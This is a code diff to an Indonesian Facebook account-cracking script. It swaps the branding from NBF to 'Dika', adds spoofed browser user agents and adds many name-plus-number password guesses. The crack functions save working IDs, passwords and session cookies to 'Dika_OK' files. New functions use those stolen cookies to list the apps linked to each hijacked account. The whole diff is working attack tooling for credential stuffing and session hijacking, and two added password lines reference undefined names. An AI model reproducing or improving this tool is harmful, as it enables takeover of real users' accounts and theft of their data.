@@ -43,8 +43,8 @@ bulane = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'Ju
 tanggal = datetime.datetime.now().day
 bulan = bulane[(str(datetime.datetime.now().month))]
 tahun = datetime.datetime.now().year
-nbf_ok = 'NBF_OK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
-nbf_cp = 'NBF_CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
+dika_ok = 'XxDika_OK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
+dika_cp = 'XxDika_CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
 #__________________ USER AGENT __________________#
 def api():
 	rr = random.randint
@@ -61,10 +61,17 @@ def api():
 	ua7 = f"Mozilla/5.0 (Linux; Android 14; SM-A236B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.15 Mobile Safari/537.36"
 	ua8 = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
 	ua9 = f"Mozilla/5.0 (Linux; Android 9; Mi Note 10 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]"
+	ua10 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/672.9 (KHTML, like Gecko) Version/18.57 Mobile/8G7LN3 Safari/702.9"
+	ua11 = f"Mozilla/5.0 (Linux; Android 9; vivo 1819 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.143 Mobile Safari/537.36"
+	ua12 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/121.0.6167.171 Mobile/15E148 Safari/604.1"
+	ua13 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
+	ua14 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/122.0 Mobile/15E148 Safari/605.1.15"
+	ua15 = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
+	ua16 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36"
 	mmk = f"Mozilla/5.0 (Linux; U; Viera; {versi}) AppleWebKit/537.36 (KHTML, like Gecko) Viera/4.0.0 Chrome/{str(rr(30,150))}.0.{str(rr(2000,6000))}.{str(rr(70,200))} Safari/537.36 SmartTV"
 	mm1 = f"Mozilla/5.0 (Linux; U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,150))}.0.{str(rr(2000,6000))}.{str(rr(25,150))} Mobile Safari/537.36 (SmartTV/8.5) (NetCast)"
 	mm2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,14))}; SAMSUNG SM-E203Y) {str(rr(111111,210000))}.0{str(rr(10,32))}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 OPX/1.0"
-	return random.choice([ua0,ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,mmk,mm1,mm2]) 	
+	return random.choice([ua0,ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11,ua12,ua13,ua14,ua15,ua16,mmk,mm1,mm2]) 
 #__________________ LOGO KONTOL __________________#
 logo=(f"""
 \x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m=====================================
@@ -76,8 +83,8 @@ logo=(f"""
 \x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m=====================================
 
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m Muhammad Andika
-\033[1;39m━▷ \033[0;91m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m CYBER
+\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m Andika
+\033[1;39m━▷ \033[0;91mTEAM    \033[1;39m◈✙◈\033[1;31m [Hermawan],[Dani]
 \033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mMuhammad Andika
 \033[1;39m━▷ \033[0;91mSTATUS  \033[1;39m  ◈✙◈ \033[0;92mPrivate
 \033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.1
@@ -194,10 +201,35 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
+					pwv.append(nmf)
 					pwv.append(frs+'123')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'321')
+					pwv.append(frs+'1')
+					pwv.append(frs+'2')
+					pwv.append(frs+'3')
+					pwv.append(frs+'01')
+					pwv.append(frs+'02')
+					pwv.append(frs+'03')
+					pwv.append(frs+'04')
+					pwv.append(frs+'05')
+					pwv.append(frs+'06')
+					pwv.append(frs+'07')
+					pwv.append(frs+'08')
+					pwv.append(frs+'09')
+					pwv.append(frs+'10')
+					pwv.append(frs+'2002')
+					pwv.append(frs+'2003')
+					pwv.append(frs+'2004')
+					pwv.append(frs+'2005')
+					pwv.append(frs+'2006')
+					pwv.append(frs+'2007')
+					pwv.append(frs+'2008')
+					pwv.append(frs+'2009')
+					pwv.append(frs+'2010')
+					pwv.append(kamunanya)
+					pwv.append(sayangku123)
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
@@ -306,13 +338,13 @@ def ngekrek(idf,pwv):
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{A}[{S}>{A}] User : {G1}{idf}\n{A}[{S}>{A}] Pass : {G1}{pw}\n{A}[{S}>{A}] Kuki : {B}{kuki}\n')
-				open('NBF_OK/'+nbf_ok,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('Dika_OK/'+dika_ok,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 			elif "checkpoint" in ses.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cps+=1
 				print(f'\r{A}[{S}>{A}] User : {Y}{idf}\n{A}[{S}>{A}] Pass : {Y}{pw}\n{A}[{S}>{A}] Ugen : {X3}{ua}\n')
-				open('NBF_CP/'+nbf_cp,'a').write(idf+'|'+pw+'\n')
+				open('Dika_CP/'+dika_cp,'a').write(idf+'|'+pw+'\n')
 				break
 			else:
 				continue
@@ -390,25 +422,68 @@ def krek(idf,pwv):
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{A}[{S}>{A}] User : {G1}{idf}\n{A}[{S}>{A}] Pass : {G1}{pw}\n{A}[{S}>{A}] Kuki : {B}{kuki}\n')
-				open('NBF_OK/'+nbf_ok,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('Dika_OK/'+dika_ok,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 			elif "checkpoint" in ses.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cps+=1
 				print(f'\r{A}[{S}>{A}] User : {Y}{idf}\n{A}[{S}>{A}] Pass : {Y}{pw}\n{A}[{S}>{A}] Ugen : {X3}{ua}\n')
-				open('NBF_CP/'+nbf_cp,'a').write(idf+'|'+pw+'\n')
+				open('Dika_CP/'+dika_cp,'a').write(idf+'|'+pw+'\n')
 				break
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
 			time.sleep(15)
 	loop+=1
-
+	
+	# CEK APLIKASI YANG TERKAIT
+def cek_apkk(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\n [+] opshh tidak ada aplikasi aktif di akun ini.")
+	else:
+		for i in range(len(game)):
+			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\n [+] opshh tidak ada aplikasi kadaluarsa di akun ini.")
+	else:
+		for i in range(len(game)):
+			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+	
+	#------[BUAT CEK APK CRACK]-------#
+def cek_apk(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+	except AttributeError:
+		print ("\r    %s \033[0mcookie invalid"%(M))
 #__________________ SYSYEM CONTROL __________________#
 if __name__ == '__main__':
-	try:os.mkdir('NBF_OK')
+	try:os.mkdir('Dika_OK')
 	except:pass
-	try:os.mkdir('NBF_CP')
+	try:os.mkdir('Dika_CP')
 	except:pass
 	try:os.system('clear')
 	except:pass
